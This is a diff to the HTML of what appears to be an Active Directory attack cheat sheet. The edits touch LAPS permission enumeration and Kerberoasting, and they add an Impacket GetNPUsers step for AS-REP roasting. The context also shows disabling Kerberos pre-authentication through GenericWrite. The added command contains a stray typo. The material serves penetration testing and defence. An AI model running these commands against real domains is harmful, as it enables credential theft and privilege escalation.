@@ -243,11 +243,7 @@ findstr<span class="w"> </span>/S<span class="w"> </span>cpassword<span class="w
 <div class="highlight"><pre><span></span><code><span class="nb">Import-Module</span> <span class="n">AdmPwd</span><span class="p">.</span><span class="nb">PS</span>
 </code></pre></div>
 <p>Find groups with privileges to access the <code>ms-mcs-AdmPwd</code> attribute:</p>
-<div class="highlight"><pre><span></span><code><span class="nb">Find-AdmPwdExtendedRights</span>
-
-<span class="c">#or filter by OUs</span>
-
-<span class="nb">Find-AdmPwdExtendedRights</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">OU</span> <span class="n">or</span> <span class="p">*&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nb">Find-AdmPwdExtendedRights</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">OU</span> <span class="n">or</span> <span class="p">*&gt;</span>
 </code></pre></div>
 <p>If any group is returned, check groups members:</p>
 <div class="highlight"><pre><span></span><code><span class="n">net</span> <span class="n">groups</span> <span class="s2">"&lt;found group&gt;"</span>
@@ -1109,9 +1105,7 @@ python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span 
 </code></pre></div>
 <p>Request TGS for the found SPN account(s):</p>
 <div class="highlight"><pre><span></span><code><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span>
-<span class="nb">New-Object</span>
-<span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityTok</span>
-<span class="n">en</span> <span class="n">-ArgumentList</span> <span class="s2">"&lt;target SPN&gt;"</span>
+<span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s2">"&lt;target SPN&gt;"</span>
 
 <span class="c"># or with PowerView</span>
 <span class="nb">Request-SPNTicket</span>
@@ -1147,6 +1141,9 @@ python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span 
 
 <span class="c"># AD Module</span>
 <span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">DoesNotRequirePreAuth</span> <span class="o">-eq</span> <span class="nv">$True</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">DoesNotRequirePreAuth</span>
+</code></pre></div>
+<p>Enumerate accounts  with Kerberos pre-authentication disabled and dump TGS with Impacket's <code>GetNPUsers</code>:</p>
+<div class="highlight"><pre><span></span><code>GetNPUsers.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;<span class="w"> </span>-usersfile<span class="w"> </span>&lt;list<span class="w"> </span>of<span class="w"> </span>users&gt;<span class="w"> </span>e&lt;domain&gt;/<span class="w"> </span>
 </code></pre></div>
 <p>Force disabling Kerberos pre-authentication for a user on which the attacker's controlled user has <code>GenericAll</code> or <code>GenericWrite</code> permissions:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="n">Control1User</span> <span class="n">-XOR</span> <span class="p">@{</span><span class="n">useraccountcontrol</span><span class="p">=</span><span class="n">4194304</span><span class="p">}</span> <span class="n">-Verbose</span>
